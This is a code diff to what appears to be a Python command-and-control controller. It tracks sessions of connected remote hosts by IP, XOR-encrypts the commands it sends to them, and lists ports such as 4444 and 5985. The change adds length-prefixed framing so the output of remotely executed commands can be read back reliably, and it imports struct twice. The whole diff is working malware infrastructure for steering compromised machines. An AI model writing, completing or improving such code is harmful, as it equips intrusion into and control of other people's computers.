@@ -2,6 +2,7 @@ import socket
 import time
 import random
 import threading
+import struct
 
 PORTS = [80, 443, 8080, 3306, 4444, 5985, 8443]
 
@@ -13,23 +14,39 @@ def xor_crypt(data: bytes, key: str) -> bytes:
     key_bytes = key.encode("utf-8")
     return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])
 
+import struct
+
 def send_command(ip, command):
-    """Always fetches the current live socket for this IP before sending."""
     try:
         with sessions_lock:
             if ip not in sessions:
-                return "[!] No active session for this IP"
+                return "[!] No active session"
             conn = sessions[ip]["conn"]
 
+        # Encode the command
         encoded = xor_crypt(command.encode("utf-8"), XOR_KEY)
-        conn.send(encoded)
+
+        # Prepend 4-byte length header
+        length_prefix = struct.pack(">I", len(encoded))
+        conn.send(length_prefix + encoded)
         time.sleep(3)
 
+        # Read response length header first (exactly 4 bytes)
+        raw_len = b""
+        while len(raw_len) < 4:
+            chunk = conn.recv(4 - len(raw_len))
+            if not chunk:
+                return "[!] Connection closed"
+            raw_len += chunk
+
+        msg_len = struct.unpack(">I", raw_len)[0]
+
+        # Read exactly msg_len bytes
         response = b""
-        conn.settimeout(5)
+        conn.settimeout(10)
         try:
-            while True:
-                chunk = conn.recv(8192)
+            while len(response) < msg_len:
+                chunk = conn.recv(msg_len - len(response))
                 if not chunk:
                     break
                 response += chunk
